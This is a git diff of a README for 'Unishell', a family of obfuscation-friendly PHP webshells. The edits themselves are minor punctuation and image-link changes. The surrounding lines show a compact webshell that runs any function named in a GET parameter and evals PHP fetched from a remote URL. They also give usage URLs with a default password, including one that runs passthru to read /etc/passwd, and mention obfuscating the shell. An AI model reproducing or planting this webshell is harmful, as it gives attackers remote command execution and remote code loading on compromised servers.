@@ -9,7 +9,7 @@ Unishell is a family of php webshells that based on nano shell (https://github.c
 **Note:** For the options `ល` is the password `ធិ៤០៤` which mean you can change the string with your password.
 
 ### Option
-`ត` for any String; `ល` for Password; `ម` for Function; `ប` for Command
+`ត` for any String; `ល` for Password; `ម` for Function; `ប` for Command;
 
 ### Usage
 `http/s://testing.com/unishell.php?ត=any&ល=password&ម=function&ប=command`
@@ -19,14 +19,14 @@ Unishell is a family of php webshells that based on nano shell (https://github.c
 `http/s://testing.com/unishell.php?ត=true&ល=ធិ៤០៤&ម=passthru&ប=cat /etc/passwd`
 
 ### Screenshot-1
-![handler](https://i.imgur.com/9fBhdpm.png)
+![handler](https://imgur.com/YS1JMHE)
 
 2. Kolab
 ```php
 `<?$ា=$_GET;if($ា[ត]!=null)$ា[ល]==ធិ៤០៤&$ា[ម]($ា[ប]); eval('?>'.file_get_contents($ា[ដ]));?>`
 ```
 ### Option
-`ត` for any String; `ល` for Password; `ម` for Function; `ប` for Command; `ដ` for Url
+`ត` for any String; `ល` for Password; `ម` for Function; `ប` for Command; `ដ` for Url;
 
 ### Usage
 `http/s://testing.com/unishell.php?ត=any&ល=password&ម=function&ប=command&ដ=url`
@@ -37,11 +37,11 @@ Unishell is a family of php webshells that based on nano shell (https://github.c
 
 ### Screenshot-2
 
-![handler](https://i.imgur.com/kLo23hE.png)
+![handler](https://imgur.com/WCfChGe)
 
 ### Screenshot-3
 
-![handler](https://i.imgur.com/WKmeVP1.png)
+![handler](https://imgur.com/HSb9rbd)
 
 ### Obfuscated
 In this code below i used yak to obfuscated it.
